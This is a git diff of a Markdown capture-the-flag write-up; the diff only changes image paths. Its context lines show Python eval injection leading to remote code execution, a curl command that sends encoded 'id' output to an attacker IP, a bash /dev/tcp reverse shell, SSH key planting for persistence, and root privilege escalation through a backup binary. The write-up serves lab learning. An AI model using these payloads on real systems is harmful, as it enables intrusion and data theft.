@@ -21,7 +21,7 @@ sticker: emoji//1f467
 # RECONNAISSANCE
 ---
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250504141045.png)
+![](Pasted image 20250504141045.png)
 
 As seen we got some math formulas we can use, also, we can get the source code, let's download it and perform some analysis on it:
 
@@ -83,9 +83,9 @@ Let's try some basic `RCE` using this:
 __import__('os').system('id')
 ```
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250504142444.png)
+![](Pasted image 20250504142444.png)
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250504142457.png)
+![](Pasted image 20250504142457.png)
 
 We get an internal server error, this happens due to the payload being evaluated by the server and then converting the non numerical string (`xa`) to an integer, this causes a `ValueError`, which throws us the `500` status code error.
 
@@ -98,7 +98,7 @@ __import__('os').system('curl http://10.11.136.34:8000?pwned=$(id|base64)')
 ```
 
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250504142758.png)
+![](Pasted image 20250504142758.png)
 
 We get `500` status code again, but if we check our python server, this happens:
 
@@ -123,7 +123,7 @@ __import__('os').system('bash -c "bash -i >& /dev/tcp/IP/9001 0>&1"')
 
 If we got our listener ready, we will receive the connection:
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250504143524.png)
+![](Pasted image 20250504143524.png)
 
 Let's begin privilege escalation.
 
@@ -145,7 +145,7 @@ export TERM=xterm
 export BASH=bash
 ```
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250504143634.png)
+![](Pasted image 20250504143634.png)
 
 We can read first flag:
 
@@ -182,7 +182,7 @@ echo 'OUR_ID_RSA.PUB KEY' >> /home/bruce/.ssh/authorized_keys
 
 Now, let's go into ssh:
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250504144058.png)
+![](Pasted image 20250504144058.png)
 
 Nice, let's proceed to analyze those interesting files we found `checklist` and `note`:
 
@@ -345,11 +345,11 @@ drwxr-xr-x 5 gordon gordon 4096 May  4 20:29 ..
 
 It seems like there is some sort of backup going in the background by the root user that backups the contents of the `report` directory but, it changes the `ownership` to root, let's use `pspy` to check if its true:
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250504153600.png)
+![](Pasted image 20250504153600.png)
 
 Nothing weird on here, maybe we are checking for a binary, let's use linpeas then:
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250504153821.png)
+![](Pasted image 20250504153821.png)
 
 We got a `/usr/bin/backup`, let's check it out:
 
@@ -388,7 +388,7 @@ drwxr-xr-x 6 gordon gordon    4096 May  4 20:36 ..
 -rw-r--r-- 1 root   root       100 May  4 21:07 report3
 ```
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250504160803.png)
+![](Pasted image 20250504160803.png)
 
 There we go, let's read root flag and finish:
 
@@ -397,5 +397,5 @@ bash-5.0# cat /root/root.txt
 THM{J0k3r$_Ar3_W1ld}
 ```
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250504160833.png)
+![](Pasted image 20250504160833.png)
 
